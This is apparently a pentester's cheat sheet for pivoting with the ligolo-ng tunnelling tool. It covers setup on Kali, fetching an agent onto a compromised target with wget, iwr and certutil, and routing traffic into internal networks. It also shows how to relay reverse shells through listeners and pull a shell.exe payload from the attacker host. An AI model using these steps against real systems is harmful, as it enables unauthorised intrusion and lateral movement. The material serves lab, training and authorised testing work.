Pivoting tool 
https://github.com/nicocha30/ligolo-ng/releases
Resources 
https://4pfsec.com/ligolo#heading-terminologies
https://www.youtube.com/watch?v=DM1B8S80EvQ
https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5

## Install
Can now be installed with apt
```
sudo apt install ligolo-ng
```

ligolo.sh
```
#!/usr/bin/bash

RED="\e[31m"
GREEN="\e[32m"
ENDCOLOR="\e[0m"

echo -e "${GREEN}Run in the same folder that proxy is in${ENDCOLOR}"
echo -e "${RED}Remember when you get a hit type session then start on ligolo interface${ENDCOLOR}"

read -p "Internal network (ex 10.10.10.0/24)   " ip
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
sudo ip route add $ip dev ligolo
ligolo-proxy -selfcert
```

```
chmod +x ligolo.sh && ./ligolo.sh
```

```
session
```

```
1
```

```
start
```

## Kali Steps for installation 
 
 ```bash
 cd /opt  
 ```

```bash
sudo mkdir ligolo 
``` 

```bash
cd ligolo
```

# Agent Links
### Linux
```bash
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz
```

### Windows
```bash
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip
```

# Server Links

###Linux

```bash
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
```

### Windows

```bash
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_windows_amd64.zip
```

2. To unzip 

```bash
sudo tar -xvf ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
```

```bash
sudo tar -xvf ligolo-ng_agent_0.7.5_linux_amd64.tar.gz
```

``` bash 
sudo unzip ligolo-ng_agent_0.7.5_windows_amd64.zip
```

```bash
sudo unzip ligolo-ng_proxy_0.7.5_windows_amd64.zip
```

```bash
sudo git clone https://git.zx2c4.com/wintun
```

Move the tools to the directory you are working from 

```sh
cp -r /opt/ligolo .
```

3. When using Linux, you need to create a tun interface on the Proxy Server (C2)
```bash
sudo ip tuntap add user kali mode tun ligolo
``` 

```bash
sudo ip link set ligolo up
```

4. Run proxy on Kali
NOTE: You can change the port to 443 if not in use 

``` bash
./proxy -selfcert -laddr $KALI:11601 
```

Use 443 for windows 
``` bash
./proxy -selfcert -laddr $KALI:443
```

6. Set up the python server 
```bash
sudo python3 -m http.server 80
```

7. Grab the agent file on the Target Machine 
Agent for Linux 
```bash
wget http://$KALI/agent 
```
Agent for Windows

If Powershell is available use 

```powershell
iwr -uri http://$KALI:80/agent.exe -Outfile agent.exe
```

cmd 

```bash 
certutil -urlcache -f http://$KALI:80/agent.exe agent.exe
```

8. Establish the connection with the agent

NOTE: You can change the port to 443 if not in use

For Linux
```bash
./agent -connect $KALI:11601 -ignore-cert
```

For Windows 
```bash
.\agent.exe -connect $KALI:443 -ignore-cert
```

9. Now type
```
session
```

11. in ligolo-ng’s interface, this will list all our sessions and we can specify the one we want either by number or using the arrow keys.

12.  Once we have determine the target network we want to pivot run this command on our Kali 
```bash
sudo ip route add 0.0.0.0/24 dev ligolo
```

11. We can confirm that the route has been added by typing 
```bash
ip route list
```

12. Go back to your ligolo interface running and type `session` and select the machine with the new tunnel and type 
```
start
```

14. We can now access the network and do enumeration and scanning

# Reverse Shells
1. Creates a listener on the machine where we're running the agent at port 1234 and redirects the traffic to port 4444 on our machine. You can use other ports, of course.

```bash
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
```

2. Set listener in Kali 
```bash
sudo rlwrap -cAr nc -lvnp 4444 

```

3. set a listener pointing to the python HTTP server on the compromised machine
```sh
listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
```

4. To verify how many listener you have run the following 
```sh
listener_list
``` 

5.  Transfer our payload or files as desired
```
iwr -uri http://$KALI:80/shell.exe -Outfile shell.exe
```

6.  To set up a redirect to pass our files to another host on the internal network we redirect to the same port
7. 
```bash
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

```bash
listener_list
```

# Internal Services 


Now let’s start the “**proxy**” in our Kali machine:

``` bash
./proxy -selfcert -laddr $KALI:11601   
```     

Now we will connect to our proxy from our client:

chmod +x agent   
``` bash
./agent -connect $KALI:11601 --ignore-cert  
```


We should see a connection:  
``` bash
session
```  

``` bash
1 
```

``` bash
start  
```


We have selected the session and started the tunnel. Most of the job is done. If we try now to access the local services of our agent, we will not be able to do so. In order to achieve that, we need to add a route for the ip “**240.0.0.1/23**”:

``` bash
sudo ip route add 240.0.0.1 dev ligolo 
```

At this point, let’s try an nmap scan specifying this IP:

``` bash
nmap 240.0.0.1 -sV                                    
```

# NOTE: IF YOU HAVE A DUAL HONED BOX WITH A PRIVATE IP CREATE AN IP ROUTE WITH THAT IP!!!!!!

```
sudo ip route add 10.10.126.254 dev ligolo 
```

